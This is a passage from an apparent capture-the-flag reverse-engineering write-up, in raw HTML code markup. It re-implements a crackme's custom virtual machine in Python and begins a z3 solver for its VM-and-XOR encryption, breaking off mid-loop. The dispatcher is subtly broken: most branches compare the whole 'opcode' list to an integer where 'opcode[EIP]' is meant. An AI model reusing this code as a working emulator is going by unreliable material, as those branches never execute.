</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>2</span> <span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>=</span> <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v3</span><span class=p>)]]</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>=</span> <span class=n>v3</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>F3</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>v2</span><span class=p>,</span> <span class=n>v3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>=</span> <span class=p>(</span><span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>+</span> <span class=n>extendKey</span><span class=p>[</span><span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v3</span><span class=p>)]]])</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>=</span> <span class=p>(</span><span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>+</span> <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v3</span><span class=p>)]])</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>=</span> <span class=p>(</span><span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>+</span> <span class=n>v3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>F4</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>v2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v1</span><span class=p>)]]</span> <span class=o>^=</span> <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>F5</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>v2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v1</span><span class=p>)]]</span> <span class=o>&amp;=</span> <span class=n>v2</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>F6</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>v2</span><span class=p>,</span> <span class=n>v3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>-=</span> <span class=n>extendKey</span><span class=p>[</span><span class=n>v3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>-=</span> <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v3</span><span class=p>)]]</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>-=</span> <span class=n>v3</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>F7</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>v2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v1</span><span class=p>)]]</span> <span class=o>|=</span> <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>F8</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>v2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v1</span><span class=p>)]]</span> <span class=o>=</span> <span class=p>(</span><span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v1</span><span class=p>)]]</span> <span class=o>&gt;&gt;</span> <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]])</span><span class=o>&amp;</span><span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>F9</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>v2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v1</span><span class=p>)]]</span> <span class=o>=</span> <span class=p>(</span><span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v1</span><span class=p>)]]</span> <span class=o>&lt;&lt;</span> <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]])</span><span class=o>&amp;</span><span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>FA</span><span class=p>(</span><span class=n>v1</span><span class=p>,</span> <span class=n>v2</span><span class=p>,</span> <span class=n>v3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>*=</span> <span class=n>extendKey</span><span class=p>[</span><span class=n>v3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>*=</span> <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v3</span><span class=p>)]]</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>v1</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=n>reg_table</span><span class=p>[</span><span class=nb>str</span><span class=p>(</span><span class=n>v2</span><span class=p>)]]</span> <span class=o>*=</span> <span class=n>v3</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>FB</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;R8&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>REG</span><span class=p>[</span><span class=s1>&#39;CNT&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>21</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>WC</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;R8&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>VM</span><span class=p>(</span><span class=n>part1</span><span class=p>,</span> <span class=n>part2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>F1</span><span class=p>(</span><span class=n>part1</span><span class=p>,</span> <span class=n>part2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>EIP</span> <span class=o>=</span> <span class=n>REG</span><span class=p>[</span><span class=s1>&#39;EIP&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=p>]</span> <span class=o>==</span> <span class=mi>80</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>F2</span><span class=p>(</span><span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>1</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>29</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>F3</span><span class=p>(</span><span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>1</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>113</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>F4</span><span class=p>(</span><span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>1</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>114</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>F5</span><span class=p>(</span><span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>1</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>150</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>F6</span><span class=p>(</span><span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>1</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>87</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>F7</span><span class=p>(</span><span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>1</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>116</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>F8</span><span class=p>(</span><span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>1</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>41</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>F9</span><span class=p>(</span><span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>1</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>2</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>220</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>FA</span><span class=p>(</span><span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>1</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>2</span><span class=p>],</span> <span class=n>opcode</span><span class=p>[</span><span class=n>EIP</span><span class=o>+</span><span class=mi>3</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>7</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>FB</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mi>153</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>WC</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>加密流程：vm和异或</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>data</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x43af236</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x56b19afc</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0xf71e21dc</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0xdb8f8e94</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x4d34e79d</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x9c520c6e</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0xfbfad5fd</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x32f9782c</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0xbbbe39c1</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0xd98575b6</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x28f8cc78</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0xa4e48592</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0xebd72c5</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0xaf87912a</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x8bf1ef96</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mh>0x1660d112</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>z3</span> <span class=kn>import</span><span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=n>Solver</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=p>[</span><span class=n>BitVec</span><span class=p>(</span><span class=s2>&#34;flag</span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>i</span><span class=p>,</span><span class=mi>64</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>2</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=c1>#flag[0] ^= data[12]</span>
</span></span><span class=line><span class=cl><span class=c1>#flag[1] ^= data[13]</span>
</span></span><span class=line><span class=cl><span class=n>extendKey</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1835819331</span><span class=p>,</span> <span class=mi>1853321028</span><span class=p>,</span> <span class=mi>1768711490</span><span class=p>,</span> <span class=mi>1432712805</span><span class=p>,</span> <span class=mi>2177920767</span><span class=p>,</span> <span class=mi>4020699579</span><span class=p>,</span> <span class=mi>2261476601</span><span class=p>,</span> <span class=mi>3551400604</span><span class=p>,</span> <span class=mi>711874531</span><span class=p>,</span> <span class=mi>3318306392</span><span class=p>,</span> <span class=mi>1124217505</span><span class=p>,</span> <span class=mi>2427199549</span><span class=p>,</span> <span class=mi>3099853672</span><span class=p>,</span> <span class=mi>2098025776</span><span class=p>,</span> <span class=mi>1041196945</span><span class=p>,</span> <span class=mi>2929936300</span><span class=p>,</span> <span class=mi>246748610</span><span class=p>,</span> <span class=mi>1941455090</span><span class=p>,</span> <span class=mi>1303848803</span><span class=p>,</span> <span class=mi>3809763535</span><span class=p>,</span> <span class=mi>1395557789</span><span class=p>,</span> <span class=mi>546751855</span><span class=p>,</span> <span class=mi>1830937100</span><span class=p>,</span> <span class=mi>2385871555</span><span class=p>,</span> <span class=mi>2516030638</span><span class=p>,</span> <span class=mi>3043054017</span><span class=p>,</span> <span class=mi>3628118989</span><span class=p>,</span> <span class=mi>1450520846</span><span class=p>,</span> <span class=mi>1825094265</span><span class=p>,</span> <span class=mi>3651791800</span><span class=p>,</span> <span class=mi>32069749</span><span class=p>,</span> <span class=mi>1469868411</span><span class=p>,</span> <span class=mi>919887482</span><span class=p>,</span> <span class=mi>4017993154</span><span class=p>,</span> <span class=mi>4002737591</span><span class=p>,</span> <span class=mi>3104343244</span><span class=p>,</span> <span class=mi>4134211933</span><span class=p>,</span> <span class=mi>420914335</span><span class=p>,</span> <span class=mi>4152510760</span><span class=p>,</span> <span class=mi>1317719524</span><span class=p>,</span> <span class=mi>1990496755</span><span class=p>,</span> <span class=mi>1873950060</span><span class=p>,</span> <span class=mi>2553314372</span><span class=p>,</span> <span class=mi>3602559392</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>ecx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>extendKey</span><span class=p>[</span><span class=n>ecx</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl><span class=n>ecx</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=n>extendKey</span><span class=p>[</span><span class=n>ecx</span><span class=p>])</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl><span class=n>cnt</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>r8</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>edx</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=c1>#cmp = [0x43af236, 0x56b19afc,0xf71e21dc, 0xdb8f8e94,0x4d34e79d, 0x9c520c6e,0xfbfad5fd, 0x32f9782c,0xbbbe39c1, 0xd98575b6,0x28f8cc78, 0xa4e48592,0xebd72c5, 0xaf87912a,0x8bf1ef96, 0x1660d112]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span><span class=p>(</span><span class=n>cnt</span> <span class=o>&lt;</span> <span class=mi>21</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>cnt</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>^=</span> <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ecx</span> <span class=o>=</span> <span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>r8</span> <span class=o>=</span> <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>&amp;=</span> <span class=mi>31</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>&lt;&lt;</span> <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>&amp;</span><span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>edx</span> <span class=o>=</span> <span class=mi>32</span>
</span></span><span class=line><span class=cl>    <span class=n>edx</span> <span class=o>-=</span> <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ecx</span> <span class=o>=</span> <span class=p>(</span><span class=n>ecx</span> <span class=o>&gt;&gt;</span> <span class=n>edx</span><span class=p>)</span><span class=o>&amp;</span><span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>|=</span> <span class=n>ecx</span><span class=o>&amp;</span><span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>cnt</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>*=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>ecx</span> <span class=o>=</span> <span class=n>extendKey</span><span class=p>[</span><span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]]</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>+</span> <span class=n>ecx</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xffffffff</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=n>r8</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>^=</span> <span class=n>flag</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span>
